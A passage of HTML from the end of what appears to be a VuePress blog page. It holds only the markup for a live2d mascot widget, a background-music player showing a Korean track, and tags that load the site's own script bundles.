    </div> <div class="operation" style="right:90px;bottom:40px;display:;" data-v-5775ee02><i class="kbnfont kbn-ban-home ban-home" data-v-5775ee02></i> <i class="kbnfont kbn-ban-message message" data-v-5775ee02></i> <i class="kbnfont kbn-ban-close close" data-v-5775ee02></i> <a target="_blank" href="https://vuepress-theme-reco.recoluan.com/views/plugins/kanbanniang.html" data-v-5775ee02><i class="kbnfont kbn-ban-info info" data-v-5775ee02></i></a> <i class="kbnfont kbn-ban-theme skin" style="display:;" data-v-5775ee02></i></div> <canvas id="banniang" width="150" height="220" class="live2d" style="right:90px;bottom:-20px;opacity:0.9;" data-v-5775ee02></canvas></div> <div class="showBanNiang" style="display:none;" data-v-5775ee02>
    看板娘
  </div></div><div class="reco-bgm-panel" data-v-b1d3339e><audio id="bgm" src="https://assets.smallsunnyfox.com/music/2.mp3" data-v-b1d3339e></audio> <div class="reco-float-box" style="bottom:10px;z-index:999999;display:none;" data-v-b1d3339e data-v-41bcba48 data-v-b1d3339e><img src="https://assets.smallsunnyfox.com/music/2.jpg" data-v-b1d3339e></div> <div class="reco-bgm-box" style="left:10px;bottom:10px;z-index:999999;" data-v-b1d3339e data-v-41bcba48 data-v-b1d3339e><div class="reco-bgm-cover" style="background-image:url(https://assets.smallsunnyfox.com/music/2.jpg);" data-v-b1d3339e><div class="mini-operation" style="display:none;" data-v-b1d3339e><i class="reco-bgm reco-bgm-pause" style="display:none;" data-v-b1d3339e></i> <i class="reco-bgm reco-bgm-play" style="display:none;" data-v-b1d3339e></i></div> <div class="falut-message" style="display:none;" data-v-b1d3339e>
          播放失败
        </div></div> <div class="reco-bgm-info" data-v-b1d3339e data-v-41bcba48 data-v-b1d3339e><div class="info-box" data-v-b1d3339e><i class="reco-bgm reco-bgm-music music" data-v-b1d3339e></i>강남역 4번 출구</div> <div class="info-box" data-v-b1d3339e><i class="reco-bgm reco-bgm-artist" data-v-b1d3339e></i>Plastic / Fallin` Dild</div> <div class="reco-bgm-progress" data-v-b1d3339e><div class="progress-bar" data-v-b1d3339e><div class="bar" data-v-b1d3339e></div></div></div> <div class="reco-bgm-operation" data-v-b1d3339e><i class="reco-bgm reco-bgm-last last" data-v-b1d3339e></i> <i class="reco-bgm reco-bgm-pause pause" style="display:none;" data-v-b1d3339e></i> <i class="reco-bgm reco-bgm-play play" data-v-b1d3339e></i> <i class="reco-bgm reco-bgm-next next" data-v-b1d3339e></i> <i class="reco-bgm reco-bgm-volume1 volume" data-v-b1d3339e></i> <i class="reco-bgm reco-bgm-mute mute" style="display:none;" data-v-b1d3339e></i> <div class="volume-bar" data-v-b1d3339e><div class="bar" data-v-b1d3339e></div></div></div></div> <div class="reco-bgm-left-box" data-v-b1d3339e data-v-41bcba48 data-v-b1d3339e><i class="reco-bgm reco-bgm-left" data-v-b1d3339e></i></div></div></div></div></div>
    <script src="/assets/js/app.ac5ad06d.js" defer></script><script src="/assets/js/3.c24abbc0.js" defer></script><script src="/assets/js/8.4563f6fd.js" defer></script>
  </body>
</html>
